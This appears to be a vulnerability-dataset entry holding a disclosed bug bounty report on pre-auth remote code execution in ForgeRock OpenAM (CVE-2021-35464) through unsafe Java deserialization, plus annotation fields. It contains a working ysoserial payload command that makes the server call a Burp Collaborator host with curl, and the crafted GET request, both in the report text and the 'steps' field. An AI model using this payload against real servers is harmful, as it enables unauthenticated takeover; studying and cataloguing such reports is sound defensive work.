@@ -1,0 +1,45 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "fdeleite ",
+  "title": "Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)",
+  "content": "\nRCE is possible thanks to unsafe Java deserialization in the Jato framework used by OpenAM.\nImpact\nAn unauthenticated, 3rd-party attacker or adversary can execute remote code\nSupporting Material/References\nhttps://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nCVE-2021-35464\nSteps to Reproduce\nSteps To Reproduce\nTarget domain: \u2588\u2588\u2588\u2588\u2588\nFirst we need to build the payload:\nDownload this jar file wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar\nthen\njava -jar ysoserial-master-SNAPSHOT.jar Click1 \"curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net\" | (echo -ne \\\\x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\\n' > payload.txt\nYou need to change the burp Collaborator id to test it properly.\nThe payload is now saved in the payload.txt file.\nNow we need to use the following request:\nCode 44 Bytes\n1GET /\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=XYZ HTTP/1.1\n2Host: 127.0.0.1\nReplace XYZ by the payload saved into the payload.txt file.\nThe response\nCode 629 Bytes\n1HTTP/1.1 302 302\n2Date: Thu, 01 Jul 2021 18:11:52 GMT\n3Server: Apache\n4Set-Cookie: session=expiry=1625163712945691;Max-Age=600;path=/;HttpOnly;Secure;\n5X-Frame-Options: SAMEORIGIN\n6Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\n7Content-Security-Policy: default-src 'unsafe-inline' 'self'; script-src 'unsafe-eval' 'unsafe-inline' 'self' https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; img-src 'self' https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n8Cache-Control: no-cache, private\n9X-Frame-Options: SAMEORIGIN\n10X-Content-Type-Options: nosniff\n11Cache-Control: private\n12Location: https://127.0.0.1:443/sso/base/AMInvalidURL\n13Content-Length: 0\n14X-XSS-Protection: 1; mode=block\n15\nThe HTTP Request sent the collaborator :\n\u2588\u2588\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1627602300,
+  "report_url": "https://hackerone.com/reports/1249456",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Download the ysoserial tool and generate a payload using a command like: `java -jar ysoserial-master-SNAPSHOT.jar Click1 \"curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net\" | (echo -ne \\x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\\n' > payload.txt`"
+    ],
+    [
+      2,
+      "Send a crafted GET request to the target with the payload from payload.txt in the URL parameter"
+    ]
+  ],
+  "vuln_description": "Pre-auth RCE in ForgeRock OpenAM due to unsafe Java deserialization in the Jato framework, allowing unauthenticated attackers to execute arbitrary code.",
+  "reason": "The attack requires knowledge of Java deserialization vulnerabilities and the specific framework (Jato) used by OpenAM. While the steps are straightforward once the payload is generated, understanding the underlying vulnerability and crafting the correct payload requires specialized knowledge.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves a pre-auth RCE through unsafe Java deserialization in the Jato framework used by OpenAM. The methodology described focuses on authentication and authorization bugs (IDOR, AuthN/AuthZ bypass) within the same application context by manipulating user sessions and resource IDs. However, the reported vulnerability is a remote code execution flaw that does not involve session or resource ID manipulation, nor does it rely on crossing authorization boundaries within the application. It is a deserialization vulnerability that can be exploited without any authentication, making it outside the scope of the described methodology.",
+    "is_detectable": false
+  }
+}
